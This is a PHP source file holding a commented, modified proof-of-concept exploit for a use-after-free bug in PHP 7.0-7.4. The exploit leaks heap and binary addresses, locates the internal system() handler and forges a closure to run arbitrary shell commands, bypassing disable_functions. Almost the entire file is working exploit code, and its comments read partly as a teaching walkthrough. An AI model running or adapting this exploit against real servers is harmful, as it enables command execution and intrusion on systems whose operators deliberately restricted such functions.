<?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

# ****************************************************************************
# *** This is a modified version with more comments & small modifications  ***
# *** For the original exploit, visit the github profile of @mm0r1         ***
# ****************************************************************************

pwn("uname -a");

function pwn($cmd) {


 # ============================== [ START OF UTILS SECTION ] =============================
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) { # scanning the memory until we find basic_functions_module->functions
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) { # scanning the memory until we find the ELF header
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) { # iterating through basic_functions_module->functions[]
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # 0x6d6574737973 is 'system' in little endian
                return leak($addr + 8); # return the handler of the basic func (address of zif_system)
            }
            $addr += 0x20; # jumping to the next index in the basic funcs array
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));  # allocating 0x68 byte chunk
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

 
 # ============================== [ END OF UTILS SECTION ] =============================

  # ============================== [ START OF EXPLOITATION PART ] =============================

    trigger_uaf('x'); # triggering the bug 
    $abc = $backtrace[1]['args'][0]; # putting our uaf'd zend_string into $abc

    $helper = new Helper; # catching $abc's memory with a Helper object
    
    # // setting values like 0x1336, 0x1337 for debugging purposes (it's easier to identify the object in memory dumps if it has known values)
    $helper->a = 0x1336;              # zend_object->properties_table[0] 
    $helper->b = function ($x) { }; # zend_object->properties_table[1] <---- we will turn this into system() soon
    $helper->c = 0x1337;              # zend_object->properties_table[2] 
    $helper->d = 0x1338;

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $php_heap = str2ptr($abc, 0x58); # leaking an addr from the heap
    $abc_addr = $php_heap - 0xc8;   # calculating the offset to get $abc's address (specifically, the zend_string.val field)

    # put a fake zend_reference somewhere in the heap after the $helper object 
    write($abc, 0x60, 2); # writing a gc field
    write($abc, 0x70, 6); # writing a type field ( 6 == IS_STRING )

    # creating a fake reference to the malicious zend_reference we instantiated above(lines 187-188)
    write($abc, 0x10, $abc_addr + 0x60); # overwriting $helper->a (we are overwriting zval.value)
    write($abc, 0x18, 0xa);              # overwriting $helper->a (we are overwriting its type, changing it to be 0xa, or 10 in decimal, which is IS_REFERENCE)


    $closure_handlers = str2ptr($abc, 0); # 0xef6dc0 <std_object_handlers>
    $binary_leak = leak($closure_handlers, 8); # dereference std_object_handlers + 8
    if(!($base = get_binary_base($binary_leak))) { # getting the base addr
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) { # getting information about the segments
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) { # using $base and $elf, we're getting the address of basic_functions_module->functions
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) { # getting zif_system addr
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $closure_obj = str2ptr($abc, 0x20); # leaking the address of the zend_closure we stored in $helper->b in line 174
    $fake_obj_offset = 0xd0; # this offset will make us land after the $helper object but also not too far to break things & crash
    for($i = 0; $i < 0x110; $i += 8) { # creating a copy of $helper->b at offset 0xd0
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # making $helper->b to point to the fresh copy we created above
    write($abc, 0x20, $abc_addr + $fake_obj_offset);

    # overwriting some of the data in our copy
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    # pwn
    ($helper->b)($cmd);
    exit();

  # ============================== [ END OF EXPLOITATION PART ] =============================

}

?>